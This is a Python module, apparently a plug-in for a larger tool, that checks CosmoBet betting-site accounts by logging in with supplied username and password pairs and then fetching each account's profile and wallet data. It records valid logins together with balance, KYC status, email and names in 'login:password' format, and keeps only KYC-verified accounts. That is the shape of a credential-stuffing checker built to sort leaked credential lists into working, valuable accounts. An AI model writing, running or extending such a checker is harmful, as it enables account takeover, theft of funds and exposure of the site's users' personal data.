from core.base_checker import BaseChecker
from typing import Dict, Any
import requests
import json

class CosmobetChecker(BaseChecker):
    """CosmoBet site checker"""
    
    # الروابط الرئيسية
    LOGIN_URL = "https://m.cosmobet.com/api/profile/login"
    PROFILE_URL = "https://m.cosmobet.com/api/profile/p/getprofile"
    WALLET_URL = "https://m.cosmobet.com/api/profile/p/getwalletswithbonusinfo"
    
    # الهيدرات المطلوبة
    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
    }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single CosmoBet account"""
        try:
            session = requests.Session()
            session.headers.update(self.HEADERS)
            
            # 1. تسجيل الدخول
            payload = {
                "UserName": username,
                "Password": password,
                "ConfirmationStatus": None
            }
            
            login_response = session.post(
                self.LOGIN_URL, 
                json=payload, 
                timeout=20
            )
            
            # 2. تحقق من الاستجابة
            if login_response.status_code != 200:
                return {"status": "bad", "username": username}
            
            login_data = login_response.json()
            
            if login_data.get("status") != 1:
                return {"status": "bad", "username": username}
            
            # 3. احصل على بيانات الملف الشخصي
            profile_response = session.get(self.PROFILE_URL, timeout=15)
            
            if profile_response.status_code != 200:
                return {"status": "error", "username": username}
            
            profile_data = profile_response.json()
            
            # 4. احصل على بيانات المحفظة
            wallet_response = session.get(self.WALLET_URL, timeout=15)
            
            balance = 0
            if wallet_response.status_code == 200:
                wallet_data = wallet_response.json()
                if wallet_data.get("UserWallets") and len(wallet_data["UserWallets"]) > 0:
                    balance = wallet_data["UserWallets"][0].get("Balance", 0)
            
            # 5. استخرج المعلومات المهمة
            kyc_status = profile_data.get("KYCStatus", False)
            deposited = profile_data.get("Deposited", False)
            email = profile_data.get("Email", "")
            country_id = profile_data.get("CountryId", "")
            phone_verified = profile_data.get("PhoneVerified", False)
            mail_verified = profile_data.get("MailVerified", False)
            
            # 6. رتب بيانات الحساب
            account_data = {
                "login": username,
                "password": password,
                "kyc_status": kyc_status,
                "deposited": deposited,
                "balance": balance,
                "email": email,
                "country_id": country_id,
                "phone_verified": phone_verified,
                "mail_verified": mail_verified,
                "first_name": profile_data.get("FirstName", ""),
                "last_name": profile_data.get("LastName", ""),
                "user_id": profile_data.get("UserProfileID", ""),
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """شروط حفظ الحساب - KYC فقط"""
        return account_data.get("kyc_status", False)
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """تنسيق حفظ الحساب في الملف"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"kyc_status={account_data['kyc_status']} | " \
               f"deposited={account_data['deposited']} | " \
               f"balance={account_data['balance']} | " \
               f"email={account_data['email']} | " \
               f"phone_verified={account_data['phone_verified']} | " \
               f"mail_verified={account_data['mail_verified']}\n"
